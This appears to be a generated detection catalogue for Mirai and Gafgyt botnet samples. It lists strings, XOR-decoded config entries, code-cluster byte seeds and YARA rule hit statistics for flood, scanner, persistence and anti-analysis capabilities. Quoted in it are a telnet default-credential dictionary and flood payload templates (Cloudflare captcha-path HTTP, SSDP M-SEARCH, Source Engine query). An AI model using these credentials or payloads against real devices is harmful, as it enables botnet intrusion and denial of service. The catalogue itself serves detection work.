# Capability catalogue: more_mirai_yara

36 capabilities, each with string/XOR/cluster evidence. Machine form: `capabilities.json`.

## How to read

tp/fn = holders hit/missed. fp = hits OUTSIDE the string-pivot holders. Many of those are true sibling variants: Ghidra merges adjacent data into one longer string (e.g. DEMONS.ppc, dicknet, UPX-packed copies), so the string index undercounts holders. total_hits = tp+fp is the honest file count. The /api/yara/test scan skips ~11 unreadable files.

## XOR tables

- **0x22**: Mirai table_unlock_val: 4-byte key 0xdeadbeef folds to 0x22. Every byte ^0x22, NUL becomes '"'. e.g. '\rRPMA\r"' = '/proc/'. 80 files (prompts system/shell/enable/ncorrect), 47-51 files (proc and watchdog paths, hakai, qtxbot, data/local). YARA: match the encoded bytes, or `xor(0x22)` on the plain word.
- **0x54**: Second table, key 0x54, terminator 'T'. e.g. ':7;&&17 T' = 'ncorrect', 'z5:=91T' = '.anime', '{6=:{6!'-6;,t?=88tymtT' = '/bin/busybox kill -9 '. 22 files. YARA `xor(0x54)` on the plain word.
- **note**: The credential dictionary is NOT in these tables here: creds appear in clear (xc3511, vizxv, 7ujMko0vizxv, telnetadmin...), mostly in the 14 DEMONS-named files.

## Summary

| id | holders | single-string rule (tp/fn/fp) | any-of-anchors (tp/fn/fp) |
|---|---|---|---|
| ddos_udp_gafgyt_bang_commands | 22 | 22/0/1 | 22/0/1 |
| ddos_udp_flood_workers | 36 | 10/26/1 | 10/26/2 |
| ddos_tcp_flood_workers | 46 | 10/36/1 | 20/26/2 |
| ddos_gre_icmp_flood | 25 | 5/20/6 | - |
| ddos_vse_source_engine_query | 12 | 12/0/0 | 12/0/0 |
| ddos_http_flood_cloudflare_bypass | 28 | 18/10/3 | 18/10/3 |
| ddos_dns_flood | 12 | - | - |
| ddos_game_protocol_floods | 36 | 2/34/0 | - |
| ssdp_msearch_amplification | 45 | 45/0/44 | - |
| telnet_default_credential_dictionary | 14 | 14/0/18 | 14/0/20 |
| telnet_login_prompt_xor22_table | 80 | 80/0/10 | 80/0/10 |
| telnet_login_prompt_xor54_table | 22 | 22/0/11 | 22/0/11 |
| telnet_scanner_bruteforce | 21 | 10/11/0 | 10/11/0 |
| competitor_killer_0cl | 48 | 48/0/0 | 48/0/0 |
| competitor_killer_by_name_port | 33 | 2/31/0 | 14/19/0 |
| hardware_watchdog_keepalive | 63 | 63/0/14 | 63/0/14 |
| single_instance_lock | 18 | 18/0/5 | - |
| persistence_ksync_initd_cron | 6 | 6/0/1 | 6/0/1 |
| persistence_crontab_tmp_z | 12 | 10/2/0 | 12/0/0 |
| anti_vm_dmi_hypervisor | 32 | 32/0/0 | 32/0/0 |
| anti_debug_ptrace_strace | 7 | 7/0/2 | - |
| router_exploit_kit_od | 10 | 10/0/0 | 10/0/0 |
| router_exploit_soap_tenda_realtek | 9 | 9/0/0 | 9/0/0 |
| self_copy_proc_hide | 9 | 9/0/0 | 9/0/0 |
| downloader_shell_chain | 16 | 16/0/0 | 16/0/0 |
| busybox_cstecgi_dvr_dropper_sh | 10 | 10/0/0 | 10/0/0 |
| c2_dns_resolve_google | 51 | 33/18/18 | - |
| c2_text_ping_pong | 32 | 32/0/11 | - |
| irc_gafgyt_commands_xor22 | 18 | 16/2/1 | 18/0/1 |
| self_rep_banner | 32 | 32/0/33 | - |
| cryptominer_xmrig | 8 | 8/0/0 | 8/0/1 |
| ssh_python_udp_deployer | 11 | 11/0/0 | 11/0/0 |
| condi_botnet_markers | 11 | 11/0/2 | 11/0/2 |
| adb_android_spread | 11 | 10/1/0 | 11/0/0 |
| go_bot_scanner_loader | 1 | 1/0/2 | - |
| family_marker_strings | 96 | 54/42/1 | 96/0/9 |

## UDP flood via gafgyt '!udp*' command grammar

`ddos_udp_gafgyt_bang_commands`  MITRE: T1498.001, T1499  holders: **22**

C2 command names '!udpplain' / '!udpcustom' compared against the received line; the UDP flood handlers they dispatch to.

Arches: {'SuperH4': 4, 'MIPS:32': 2, '68000': 2, 'PowerPC': 2, 'RISCV:32': 2, 'AARCH64': 2, 'x86:32': 2, 'RISCV:64': 2, 'Loongarch': 2, 'x86:64': 2}  
Name stems: {'MD5.unpacked': 10, 'xnxnxnxnxnxnxnxn': 8, 'xnxnxnxnxnxnxnxnsh2x': 2, 'xnxnxnxnxnxnxnxnloon': 2}

Evidence:

- [string] `'!udpplain'` files=22 arches={'SuperH4': 4, 'MIPS:32': 2, '68000': 2, 'PowerPC': 2} gafgyt-style bang command (no leading '!*' on this build)
- [string] `'!udpcustom'` files=22 arches={'SuperH4': 4, 'MIPS:32': 2, '68000': 2, 'PowerPC': 2} sibling command, same holder set

Cluster holding the anchor string, per arch:

- MIPS:32: cl 1073742303 (FUN_0040559c, 2 members, coh 1.0)
- RISCV:64: cl 1073886164 (FUN_ram_00012f94, 4 members, coh 0.99)
- Loongarch: cl 1073778486 (FUN_ram_120005b80, 2 members, coh 1.0)
- AARCH64: cl 1073781348 (FUN_004058c0, 2 members, coh 1.0)
- RISCV:32: cl 1073886164 (FUN_ram_00012f94, 4 members, coh 0.99)
- x86:64: cl 1073808361 (FUN_00408350, 2 members, coh 1.0)
- 68000: cl 1073790974 (FUN_80003866, 2 members, coh 1.0)
- PowerPC: cl 1073861939 (FUN_10005700, 2 members, coh 1.0)

Seed bytes (cluster 1073886164):

- RISCV:LE:32:AndeStar_v5 w16 cov=1.0: `{ 63 07 05 12 13 01 01 d8 23 2c 81 26 23 2a 91 26 }`
- RISCV:LE:64:default w16 cov=1.0: `{ 63 07 05 12 13 01 01 d4 23 38 81 2a 23 34 91 2a }`

Test one-string `"!udpplain"`: tp=22 fn=0 fp=1 (total hits 23)
Test any-of 2 anchors: tp=22 fn=0 fp=1

Rule hint: Two exact strings co-occur in every holder; require both plus one libc-agnostic anchor (e.g. /tmp/.bot_lock) to cut the single-file false hit.

## UDP flood worker functions (plain/generic/bypass/custom/hex/nudp)

`ddos_udp_flood_workers`  MITRE: T1498.001  holders: **36**

Mirai-derived attack_udp_* handlers: raw/DGRAM sockets, random payload via rand_next/rand_str, per-method opts through attack_get_opt_*.

Arches: {'ARM': 28, 'MIPS:32': 5, 'PowerPC': 1, '68000': 1, 'x86:32': 1}  
Name stems: {'MD5.unpacked': 12, '': 9, 'DEMONS': 4, 'p': 2, 'nuclear': 2, 'MD5': 2, 'MD5MD5': 2, 'MD5MD5.elf': 2, 'kkk': 1}

Evidence:

- [string] `"[udp_plain_flood] started: ('%d')\n"` files=10 arches={'MIPS:32': 5, 'ARM': 2, '68000': 1, 'x86:32': 1} verbose worker log string (debug-friendly build, MIPS/ARM/x86/PPC/m68k)
- [string] `"[udp_flood] started: ('%d')\n"` files=10 arches={'MIPS:32': 5, 'ARM': 2, '68000': 1, 'x86:32': 1} 
- [string] `"[udpbypass_flood] started: ('%d')\n"` files=5 arches={'ARM': 2, '68000': 1, 'x86:32': 1, 'PowerPC': 1} 
- [string] `'[udp_flood] socket() failed'` files=9 arches={'MIPS:32': 5, 'ARM': 2, '68000': 1, 'PowerPC': 1} 

Function clusters (named, unstripped builds):

- cl 1073888704 `attack_udp_plain` members=51 files=24 coh=0.96 arch={'ARM': 24}
- cl 1073887222 `attack_tcp_syn` members=50 files=26 coh=0.99 arch={'ARM': 26}
- cl 1073856796 `attack_udp_vse` members=22 files=20 coh=1.0 arch={'ARM': 20}
- cl 1073886304 `attack_udp_generic` members=18 files=18 coh=1.0 arch={'ARM': 18}
- cl 1073831543 `attack_method_udphex` members=14 files=8 coh=1.0 arch={'ARM': 8}

Cluster holding the anchor string, per arch:

- 68000: cl 1073741824 (FUN_80001a54, 2 members, coh 1.0)
- PowerPC: cl 1073741937 (FUN_10001e20, 2 members, coh 1.0)
- MIPS:32: cl 1073881294 (FUN_00402360, 10 members, coh 1.0)
- ARM: cl 1073782754 (udp_plain_flood_wuhan, 2 members, coh 1.0)
- x86:32: cl 1073844099 (FUN_08049a00, 2 members, coh 1.0)

Seed bytes (cluster 1073888704):

- ARM:LE:32:v8 w16 cov=1.0: `{ f0 4f 2d e9 2c d0 4d e2 04 10 8d e5 04 10 a0 e3 }`

Test one-string `{ 5b 75 64 70 5f 70 6c 61 69 6e 5f 66 6c 6f 6f 64 5d 20 73 74 61 72 74`: tp=10 fn=26 fp=1 (total hits 11)
Test any-of 3 anchors: tp=10 fn=26 fp=2

Rule hint: Cluster seeds are per-arch and ARM-heavy (named attack_udp_* in unstripped ARM builds); string logs are the cross-arch anchor.

## TCP SYN/ACK/STOMP/bypass/legit/xmas flood workers

`ddos_tcp_flood_workers`  MITRE: T1498.001, T1499.002  holders: **46**

attack_tcp_{syn,ack,stomp,bypass,legit,socket,xmas} handlers (raw TCP, handshake stomp, flag permutations).

Arches: {'ARM': 31, 'MIPS:32': 6, 'x86:32': 3, 'PowerPC': 2, '68000': 2, 'x86:64': 1, 'SuperH4': 1}  
Name stems: {'MD5.unpacked': 12, '': 9, 'DEMONS': 4, 'p': 2, 'nuclear': 2, 'MD5': 2, 'MD5MD5': 2, 'MD5MD5.elf': 2, 'weednet': 1, 'unet': 1}

Evidence:

- [string] `"[syn_flood] started: ('%d')\n"` files=5 arches={'ARM': 2, '68000': 1, 'x86:32': 1, 'PowerPC': 1} 
- [string] `"[ack_flood] started: ('%d')\n"` files=5 arches={'ARM': 2, '68000': 1, 'x86:32': 1, 'PowerPC': 1} 
- [string] `"[tcpbypass_flood] started: ('%d')\n"` files=10 arches={'MIPS:32': 5, 'ARM': 2, '68000': 1, 'x86:32': 1} 
- [string] `'[syn_flood] socket() failed'` files=4 arches={'ARM': 2, 'PowerPC': 1, '68000': 1} 
- [string] `'DOMINATE Flooding %s for %d seconds.'` files=10 arches={'ARM': 3, 'x86:32': 2, '68000': 1, 'x86:64': 1} dominate (net-named gafgyt sub-family)
- [string] `'[INFO] STOMP attack is not implemented in this version.'` files=1 arches={'x86:64': 1} 

Function clusters (named, unstripped builds):

- cl 1073887222 `attack_tcp_syn` members=50 files=26 coh=0.99 arch={'ARM': 26}
- cl 1073888809 `attack_tcp_ack` members=40 files=24 coh=0.99 arch={'ARM': 24}
- cl 1073886451 `attack_tcp_stomp` members=32 files=22 coh=0.99 arch={'ARM': 22}
- cl 1073844823 `attack_tcp_bypass` members=8 files=8 coh=1.0 arch={'ARM': 8}
- cl 1073844824 `attack_tcp_socket` members=8 files=8 coh=1.0 arch={'ARM': 8}

Cluster holding the anchor string, per arch:

- ARM: cl 1073886424 (FUN_0000a010, 2 members, coh 0.98)

Seed bytes (cluster 1073887222):

- ARM:LE:32:v8 w16 cov=1.0: `{ f0 4f 2d e9 01 80 a0 e1 74 d0 4d e2 04 10 a0 e3 }`

Test one-string `{ 5b 73 79 6e 5f 66 6c 6f 6f 64 5d 20 73 74 61 72 74 65 64 3a 20 28 27`: tp=10 fn=36 fp=1 (total hits 11)
Test any-of 4 anchors: tp=20 fn=26 fp=2

Rule hint: Prefer string logs for the non-ARM holders; ARM attack_tcp_* clusters (cohesion 0.99) are the code anchor.

## GRE (IP/ETH) and ICMP flood

`ddos_gre_icmp_flood`  MITRE: T1498.001  holders: **25**

attack_gre_ip / attack_gre_eth encapsulated floods and ICMP echo flood.

Arches: {'ARM': 22, 'PowerPC': 1, '68000': 1, 'x86:32': 1}  
Name stems: {'MD5.unpacked': 6, '': 5, 'DEMONS': 4, 'p': 2, 'nuclear': 2, 'MD5MD5': 2, 'MD5MD5.elf': 2, 'MD5': 1, 'kkk': 1}

Evidence:

- [string] `"[icmp_flood] started: ('%d')\n"` files=5 arches={'ARM': 2, '68000': 1, 'x86:32': 1, 'PowerPC': 1} 

Function clusters (named, unstripped builds):

- cl 1073856790 `attack_gre_ip` members=22 files=20 coh=1.0 arch={'ARM': 20}
- cl 1073886374 `attack_gre_eth` members=18 files=18 coh=1.0 arch={'ARM': 18}
- cl 1073887469 `FUN_00014f74` members=2 files=2 coh=0.95 arch={'ARM': 2}
- cl 1073887999 `FUN_0001564c` members=2 files=2 coh=0.93 arch={'ARM': 2}
- cl 1073842622 `attack_method_icmpflood` members=2 files=2 coh=1.0 arch={'ARM': 2}

Cluster holding the anchor string, per arch:

- ARM: cl 1073886182 (FUN_0001784c, 2 members, coh 0.98)

Seed bytes (cluster 1073856790):

- ARM:LE:32:v8 w16 cov=1.0: `{ f0 4f 2d e9 01 90 a0 e1 64 d0 4d e2 04 10 a0 e3 }`

Test one-string `{ 5b 69 63 6d 70 5f 66 6c 6f 6f 64 5d 20 73 74 61 72 74 65 64 3a 20 28`: tp=5 fn=20 fp=6 (total hits 11)

Rule hint: Code-only in most holders: use cluster seed bytes (attack_gre_ip cl 1073856790, 20 ARM files).

## VSE flood: 'TSource Engine Query'

`ddos_vse_source_engine_query`  MITRE: T1498.001  holders: **12**

Valve Source Engine query payload flood (attack_udp_vse / vseattack).

Arches: {'MIPS:32': 3, 'ARM': 3, 'x86:32': 2, '68000': 1, 'x86:64': 1, 'SuperH4': 1, 'PowerPC': 1}  
Name stems: {'cock': 1, 'weednet': 1, 'net': 1, 'dicknet': 1, 'fucknet': 1, 'gaynet': 1, 'swatnet': 1, 'botnet': 1, 'ballnet': 1, 'MD5': 1}

Evidence:

- [string] `'TSource Engine Query + /x54/x53/x6f/x75/x72/x63/x65/x20/x45/x6e/x67/x6'` files=12 arches={'MIPS:32': 3, 'ARM': 3, 'x86:32': 2, '68000': 1} gafgyt vseattack variant (escaped /x54/x53.. text next to it)
- [string] `'TSource Engine Query + /x54/x53/x6f/x75/x72/x63/x65/x20/x45/x6e/x67/x6'` files=12 arches={'MIPS:32': 3, 'ARM': 3, 'x86:32': 2, '68000': 1} exact payload string (Mirai table entry / gafgyt)
- [string] `'SNQUERY: 127.0.0.1:AAAAAA:xsvr'` files=55 arches={'ARM': 22, 'x86:32': 11, 'PowerPC': 6, 'x86:64': 5} companion game-server query payload, 55 files (Mirai UDP game floods)

Function clusters (named, unstripped builds):

- cl 1073856796 `attack_udp_vse` members=22 files=20 coh=1.0 arch={'ARM': 20}
- cl 1073796272 `vseattack` members=3 files=3 coh=1.0 arch={'MIPS:32': 3}
- cl 1073887376 `FUN_0000c878` members=2 files=2 coh=0.95 arch={'ARM': 2}
- cl 1073837228 `vseattack` members=2 files=2 coh=1.0 arch={'ARM': 2}
- cl 1073888799 `vseattack` members=2 files=2 coh=0.92 arch={'ARM': 2}

Cluster holding the anchor string, per arch:

- MIPS:32: cl 1073796272 (vseattack, 3 members, coh 1.0)
- ARM: cl 1073837228 (vseattack, 2 members, coh 1.0)

Seed bytes (cluster 1073856796):

- ARM:LE:32:v8 w16 cov=1.0: `{ f0 4f 2d e9 01 a0 a0 e1 34 d0 4d e2 04 10 a0 e3 }`

Test one-string `"TSource Engine Query + /x54/x53/x6f/x75/x72/x63/"`: tp=12 fn=0 fp=0 (total hits 12)
Test any-of 2 anchors: tp=12 fn=0 fp=0

Rule hint: Two spellings: gafgyt text 'TSource Engine Query' and Mirai table-decoded; SNQUERY is a much broader marker.

## HTTP flood with Cloudflare captcha-path / UA rotation

`ddos_http_flood_cloudflare_bypass`  MITRE: T1499.002, T1498  holders: **28**

GET/POST floods against /cdn-cgi/l/chk_captcha, Cookie/User-Agent builders, attack_app_http, httpattack.

Arches: {'ARM': 16, 'x86:32': 3, 'MIPS:32': 2, '68000': 2, 'PowerPC': 2, 'sparc': 1, 'x86:64': 1, 'SuperH4': 1}  
Name stems: {'': 7, 'MD5.unpacked': 4, 'MD5MD5': 2, 'nuclear': 2, 'MD5MD5.elf': 2, 'cock': 1, 'weednet': 1, 'net': 1, 'dicknet': 1, 'fucknet': 1}

Evidence:

- [string] `'%s /cdn-cgi/l/chk_captcha HTTP/1.1\r\nHost: %s\r\nUser-Agent: %s\r\nConnecti'` files=18 arches={'ARM': 6, 'x86:32': 3, '68000': 2, 'MIPS:32': 2} exact request template
- [string] `'%s /cdn-cgi/l/chk_captcha CFKILL/1.1\r\nHost: %s\r\nUser-Agent: %s\r\nConnec'` files=11 arches={'ARM': 3, 'x86:32': 2, 'MIPS:32': 2, '68000': 1} CFKILL gafgyt variant
- [string] `' HTTP/1.1\r\nUser-Agent: '` files=22 arches={'ARM': 10, 'MIPS:32': 7, 'x86:32': 2, 'x86:64': 2} generic fragment, low specificity
- [string] `'\r\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/53'` files=21 arches={'ARM': 8, 'x86:32': 6, 'MIPS:32': 3, '68000': 2} long UA fragment
- [string] `'Cookie: '` files=23 arches={'ARM': 10, 'MIPS:32': 8, 'x86:32': 2, 'x86:64': 2} generic

Function clusters (named, unstripped builds):

- cl 1073887716 `FUN_00008d3c` members=8 files=8 coh=0.97 arch={'ARM': 8}
- cl 1073885976 `httpattack` members=4 files=4 coh=1.0 arch={'PowerPC': 1, 'ARM': 1, 'MIPS:32': 2}
- cl 1073887682 `FUN_0000986c` members=2 files=2 coh=0.94 arch={'ARM': 2}
- cl 1073837240 `httpattack` members=2 files=2 coh=1.0 arch={'ARM': 2}
- cl 1073812697 `httpattack` members=2 files=2 coh=1.0 arch={'x86:32': 2}

Cluster holding the anchor string, per arch:

- MIPS:32: cl 1073889201 (sendHTTPtwo, 6 members, coh 0.95)
- ARM: cl 1073886354 (SendHTTPCloudflare, 8 members, coh 0.99)
- SuperH4: cl 1073780624 (sendHTTPtwo, 2 members, coh 1.0)
- x86:64: cl 1073888860 (sendHTTPtwo, 3 members, coh 0.94)
- PowerPC: cl 1073889201 (sendHTTPtwo, 6 members, coh 0.95)
- x86:32: cl 1073889010 (sendHTTPtwo, 6 members, coh 0.95)
- 68000: cl 1073883166 (sendHTTPtwo, 2 members, coh 1.0)

Seed bytes (cluster 1073887716):


Test one-string `{ 25 73 20 2f 63 64 6e 2d 63 67 69 2f 6c 2f 63 68 6b 5f 63 61 70 74 63`: tp=18 fn=10 fp=3 (total hits 21)
Test any-of 2 anchors: tp=18 fn=10 fp=3

Rule hint: chk_captcha path is the discriminator; avoid Cookie:/User-Agent alone.

## DNS flood / water-torture style

`ddos_dns_flood`  MITRE: T1498.002  holders: **12**

attack_udp_dns / attack_method_udpdns handlers (random-label DNS queries). No unique strings: code-only.

Arches: {'ARM': 12}  
Name stems: {'DEMONS': 4, '': 2, 'MD5.unpacked': 2, 'MD5MD5': 2, 'MD5MD5.elf': 2}

Evidence:


Function clusters (named, unstripped builds):

- cl 1073886487 `FUN_0000ed4c` members=10 files=10 coh=1.0 arch={'ARM': 10}
- cl 1073887220 `FUN_0000ddbc` members=2 files=2 coh=0.95 arch={'ARM': 2}
- cl 1073831554 `FUN_0000e28c` members=2 files=2 coh=1.0 arch={'ARM': 2}

Seed bytes (cluster 1073886487):

- ARM:LE:32:v8 w16 cov=1.0: `{ f0 4f 2d e9 89 de 4d e2 04 d0 4d e2 18 10 8d e5 }`

Rule hint: Use cluster 1073886487 seeds (10 ARM files).

## Game / app-protocol floods (Minecraft, RakNet, Discord, OpenVPN, Ragnarok)

`ddos_game_protocol_floods`  MITRE: T1498.001  holders: **36**

Specialised attack handlers named attack_tcp_minecraft, attack_raknet_burst, attack_udp_discord, attack_udp_openvpn, attack_udp_ragnarok.

Arches: {'ARM': 29, 'MIPS:32': 4, 'MIPS:64': 2, 'x86:64': 1}  
Name stems: {'MD5.unpacked': 14, 'MD5': 9, 'DEMONS': 4, '': 2, 'p': 2, 'MD5MD5': 2, 'MD5MD5.elf': 2, 'kkk': 1}

Evidence:

- [string] `'MINECRAFT'` files=2 arches={'MIPS:32': 2} 

Function clusters (named, unstripped builds):

- cl 1073887863 `net.(*sysDialer).dialIP.func1` members=77 files=7 coh=0.97 arch={'MIPS:64': 2, 'MIPS:32': 2, 'ARM': 3}
- cl 1073856796 `attack_udp_vse` members=22 files=20 coh=1.0 arch={'ARM': 20}
- cl 1073887637 `attack_udp_custom` members=10 files=10 coh=0.97 arch={'ARM': 10}
- cl 1073787127 `vortax_server/Methods.StartPPS` members=6 files=2 coh=1.0 arch={'MIPS:64': 2}
- cl 1073836520 `crypto/tls.(*xorNonceAEAD).Overhead` members=6 files=1 coh=1.0 arch={'x86:64': 1}

Cluster holding the anchor string, per arch:


Seed bytes (cluster 1073887863):

- ARM:LE:32:v8 w16 cov=1.0: `{ 08 10 9a e5 01 00 5d e1 13 00 00 9a 20 e0 2d e5 }`

Test one-string `"MINECRAFT"`: tp=2 fn=34 fp=0 (total hits 2)

Rule hint: Rare (2-4 files each); rule per sample, not per family.

## SSDP M-SEARCH discovery / amplification flood

`ssdp_msearch_amplification`  MITRE: T1498.002, T1046  holders: **45**

Embedded 'M-SEARCH * HTTP/1.1 ... ssdp:discover' datagram (HOST 255.255.255.255:1900), SSDP reflection/flood payload.

Arches: {'ARM': 18, 'x86:32': 9, 'PowerPC': 5, 'x86:64': 4, 'sparc': 4, '68000': 4, 'MIPS:32': 1}  
Name stems: {'MD5.unpacked': 24, 'nuclear': 10, 'boatnet': 6, 'MD5MD5': 5}

Evidence:

- [string] `'M-SEARCH * HTTP/1.1\r\nHOST: 255.255.255.255:1900\r\nMAN: "ssdp:discover"\r'` files=45 arches={'ARM': 18, 'x86:32': 9, 'PowerPC': 5, 'x86:64': 4} 
- [string] `'M-SEARCH * HTTP/1.1\r\nHOST: 239.255.255.250:1900\r\nMAN: "ssdp:discover"\r'` files=1 arches={'MIPS:32': 1} multicast spelling, one MIPS sample

Cluster holding the anchor string, per arch:

- x86:32: cl 1073887464 (FUN_0804e590, 5 members, coh 0.97)
- ARM: cl 1073831300 (attack_method_nudp, 10 members, coh 1.0)
- PowerPC: cl 1073883027 (FUN_10005d04, 5 members, coh 1.0)
- 68000: cl 1073878195 (FUN_80005402, 5 members, coh 1.0)
- sparc: cl 1073805459 (FUN_00015b44, 3 members, coh 1.0)
- x86:64: cl 1073882050 (FUN_004058c0, 5 members, coh 1.0)

Seed bytes (cluster 1073831300):

- ARM:LE:32:v8 w16 cov=1.0: `{ f0 4f 2d e9 ec d0 4d e2 48 20 8d e5 44 30 8d e5 }`

Test one-string `{ 4d 2d 53 45 41 52 43 48 20 2a 20 48 54 54 50 2f 31 2e 31 0d 0a 48 4f`: tp=45 fn=0 fp=44 (total hits 89)

Rule hint: 45 files across ARM/x86/PPC/sparc/m68k; use first 40 bytes.

## Telnet default-credential dictionary (plaintext)

`telnet_default_credential_dictionary`  MITRE: T1110.001, T1078.001  holders: **14**

Mirai/DEMONS-style credential list in clear: xc3511, vizxv, 7ujMko0vizxv, telnetadmin, telecomadmin, smcadmin, Zte521, dvr2580222, juantech ...

Arches: {'ARM': 7, 'MIPS:32': 4, '68000': 1, 'sparc': 1, 'SuperH4': 1}  
Name stems: {'DEMONS': 12, 'bin': 1, 'MD5': 1}

Evidence:

- [string] `'xc3511'` files=14 arches={'ARM': 7, 'MIPS:32': 4, '68000': 1, 'sparc': 1} 
- [string] `'vizxv'` files=14 arches={'ARM': 7, 'MIPS:32': 4, '68000': 1, 'sparc': 1} 
- [string] `'7ujMko0vizxv'` files=13 arches={'ARM': 7, 'MIPS:32': 4, 'sparc': 1, 'SuperH4': 1} 
- [string] `'telnetadmin'` files=16 arches={'ARM': 7, 'MIPS:32': 4, 'PowerPC': 2, '68000': 1} 
- [string] `'telecomadmin'` files=16 arches={'ARM': 7, 'MIPS:32': 4, 'PowerPC': 2, '68000': 1} 
- [string] `'smcadmin'` files=16 arches={'ARM': 7, 'MIPS:32': 4, 'PowerPC': 2, '68000': 1} 
- [string] `'Zte521'` files=14 arches={'ARM': 7, 'MIPS:32': 4, '68000': 1, 'sparc': 1} 
- [string] `'dvr2580222'` files=12 arches={'ARM': 7, 'MIPS:32': 2, '68000': 1, 'sparc': 1} 

Function clusters (named, unstripped builds):

- cl 1073831954 `scanner_kill` members=27 files=9 coh=1.0 arch={'ARM': 9}
- cl 1073853775 `scanner_thread` members=4 files=4 coh=1.0 arch={'ARM': 4}
- cl 1073856098 `scanner_init` members=2 files=2 coh=1.0 arch={'ARM': 2}
- cl 1073834094 `scanner_thread` members=2 files=2 coh=1.0 arch={'MIPS:32': 2}
- cl 1073831955 `realtek_scanner_init` members=2 files=1 coh=1.0 arch={'ARM': 1}

Cluster holding the anchor string, per arch:

- ARM: cl 1073766605 (FUN_0000e3cc, 2 members, coh 1.0)
- MIPS:32: cl 1073845860 (FUN_00410c9c, 2 members, coh 1.0)

Seed bytes (cluster 1073831954):

- ARM:LE:32:v8 w16 cov=1.0: `{ 04 e0 2d e5 18 30 9f e5 04 d0 4d e2 00 00 93 e5 }`

Test one-string `"xc3511"`: tp=14 fn=0 fp=18 (total hits 32)
Test any-of 4 anchors: tp=14 fn=0 fp=20

Rule hint: Require 3 of N credential strings: single words (admin/default/support) fire on libc and many files.

## XOR-0x22 config table: telnet login prompts + proc/watchdog paths

`telnet_login_prompt_xor22_table`  MITRE: T1027, T1110.001, T1059.004  holders: **80**

Mirai table_unlock_val strings stored XOR-encoded, key xor 0x22 (Mirai table_unlock_val key: 0xdeadbeef folded = 0x22). Decodes to login prompts and kill/persist paths. Several variants (Hakai/qtxbot) share the table.

Arches: {'ARM': 28, 'MIPS:32': 17, 'x86:32': 15, '68000': 7, 'x86:64': 6, 'sparc': 4, 'SuperH4': 3}  
Name stems: {'MD5.unpacked': 42, 'p': 29, 'boatnet': 6, 'm-p.s-l.dick': 1, 'MD5MD5.elf': 1, 'MD5': 1}

Evidence:

- [xor22] `'LAMPPGAV"'` decoded `ncorrect` files=80 arches={'ARM': 28, 'MIPS:32': 17, 'x86:32': 15, '68000': 7} -> 'ncorrect' (login failure prompt) key 0x22
- [xor22] `'Q[QVGO"'` decoded `system` files=80 arches={'ARM': 28, 'MIPS:32': 17, 'x86:32': 15, '68000': 7} -> 'system'
- [xor22] `'QJGNN"'` decoded `shell` files=80 arches={'ARM': 28, 'MIPS:32': 17, 'x86:32': 15, '68000': 7} -> 'shell'
- [xor22] `'GLC@NG"'` decoded `enable` files=80 arches={'ARM': 28, 'MIPS:32': 17, 'x86:32': 15, '68000': 7} -> 'enable'
- [xor22] `'\rRPMA\r"'` decoded `/proc/` files=51 arches={'ARM': 17, 'MIPS:32': 13, 'x86:32': 8, 'x86:64': 4} -> '/proc/'
- [xor22] `'\rFGT\rUCVAJFME"'` decoded `/dev/watchdog` files=49 arches={'ARM': 16, 'MIPS:32': 12, 'x86:32': 8, 'x86:64': 4} -> '/dev/watchdog'
- [xor22] `'\rFGT\rOKQA\rUCVAJFME"'` decoded `/dev/misc/watchdog` files=49 arches={'ARM': 16, 'MIPS:32': 12, 'x86:32': 8, 'x86:64': 4} -> '/dev/misc/watchdog'
- [xor22] `'\rRPMA\rLGV\rVAR"'` decoded `/proc/net/tcp` files=47 arches={'ARM': 16, 'MIPS:32': 10, 'x86:32': 8, 'x86:64': 4} -> '/proc/net/tcp'

Function clusters (named, unstripped builds):

- cl 1073888263 `FUN_00415eec` members=107 files=107 coh=0.99 arch={'MIPS:32': 50, 'sparc': 7, 'PowerPC': 13, '68000': 10, 'x86:32': 13, 'SuperH4': 12, 'ARM': 2}
- cl 1073888905 `table_lock_val` members=55 files=31 coh=0.99 arch={'ARM': 27, 'MIPS:32': 4}
- cl 1073887903 `table_init` members=33 files=33 coh=0.97 arch={'ARM': 12, 'x86:64': 3, 'sparc': 3, 'PowerPC': 3, 'MIPS:32': 6, 'x86:32': 6}
- cl 1073880296 `table_retrieve_val` members=29 files=29 coh=1.0 arch={'ARM': 29}
- cl 1073888733 `table_init` members=14 files=14 coh=0.93 arch={'x86:32': 2, 'PowerPC': 2, 'MIPS:32': 5, 'ARM': 4, 'SuperH4': 1}

Cluster holding the anchor string, per arch:

- x86:32: cl 1073887903 (table_init, 33 members, coh 0.97)
- ARM: cl 1073844850 (table_init, 6 members, coh 1.0)
- 68000: cl 1073755060 (FUN_8000687e, 2 members, coh 1.0)
- MIPS:32: cl 1073887903 (table_init, 33 members, coh 0.97)
- sparc: cl 1073887903 (table_init, 33 members, coh 0.97)
- SuperH4: cl 1073842088 (FUN_00406220, 2 members, coh 1.0)
- x86:64: cl 1073887903 (table_init, 33 members, coh 0.97)

Seed bytes (cluster 1073888263):

- 68000:BE:32:Coldfire w16 cov=1.0: `{ 22 2f 00 04 22 6f 00 08 20 01 e7 88 d2 81 90 81 }`
- ARM:LE:32:v8 w16 cov=1.0: `{ 0d c0 a0 e1 00 d8 2d e9 04 b0 4c e2 10 d0 4d e2 }`

Test one-string `{ 4c 41 4d 50 50 47 41 56 22 }`: tp=80 fn=0 fp=10 (total hits 90)
Test any-of 4 anchors: tp=80 fn=0 fp=10

Rule hint: YARA: `xor(0x22)` modifier on plain words ('ncorrect','shell','enable') or match the encoded bytes directly; 4 encoded prompts together are far more specific than any one.

## XOR-0x54 config table (anime-style gafgyt/mirai hybrid)

`telnet_login_prompt_xor54_table`  MITRE: T1027, T1110.001  holders: **22**

Same table idea, key xor 0x54: decodes to '.anime', '/bin/busybox kill -9 ', 'nameserver ', prompts and /proc paths.

Arches: {'ARM': 9, 'MIPS:32': 5, 'SuperH4': 3, '68000': 2, 'x86:32': 2, 'sparc': 1}  
Name stems: {'DEMONS': 16, '': 4, 'chernobyl': 1, 'Josho': 1}

Evidence:

- [xor54] `':7;&&17 T'` decoded `ncorrect` files=22 arches={'ARM': 9, 'MIPS:32': 5, 'SuperH4': 3, '68000': 2} -> 'ncorrect'
- [xor54] `'1:5681T'` decoded `enable` files=22 arches={'ARM': 9, 'MIPS:32': 5, 'SuperH4': 3, '68000': 2} -> 'enable'
- [xor54] `"'<188T"` decoded `shell` files=22 arches={'ARM': 9, 'MIPS:32': 5, 'SuperH4': 3, '68000': 2} -> 'shell'
- [xor54] `"'-' 19T"` decoded `system` files=22 arches={'ARM': 9, 'MIPS:32': 5, 'SuperH4': 3, '68000': 2} -> 'system'
